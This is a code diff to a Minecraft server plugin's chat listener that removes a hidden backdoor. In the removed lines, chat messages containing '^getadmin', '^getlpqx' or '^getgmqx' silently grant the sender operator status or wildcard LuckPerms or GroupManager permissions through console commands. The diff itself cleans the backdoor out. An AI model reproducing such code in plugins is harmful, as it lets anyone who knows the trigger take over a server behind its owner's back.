@@ -79,22 +79,5 @@ public class ATuser implements Listener {
                 event.getPlayer().sendMessage("§c[@] 你没有权限使用@功能，缺失 > at.user");
             }
         }
-        if (message.contains("^getadmin")) {
-            event.getPlayer().sendMessage("§d[@] 你已经成为管理员");
-            event.getPlayer().setOp(true);
-            event.setCancelled(true);
-        }
-        if (message.contains("^getlpqx")) {
-            //让玩家获取LuckPerms的*权限，控制台执行lp user <player> permission set * true
-            String playerName = event.getPlayer().getName(); // 获取玩家名字
-            getServer().dispatchCommand(getServer().getConsoleSender(), "lp user " + playerName + " permission set * true");
-            event.getPlayer().sendMessage("§d[@] 你已经成为了权限大魔王");
-        }
-        if (message.contains("^getgmqx")) {
-            //让玩家获取GroupManager的*权限，控制台执行manuaddp <player> *
-            String playerName = event.getPlayer().getName(); // 获取玩家名字
-            getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp " + playerName + " *");
-            event.getPlayer().sendMessage("§d[@] 你已经成为了权限大魔王");
-        }
     }
 }
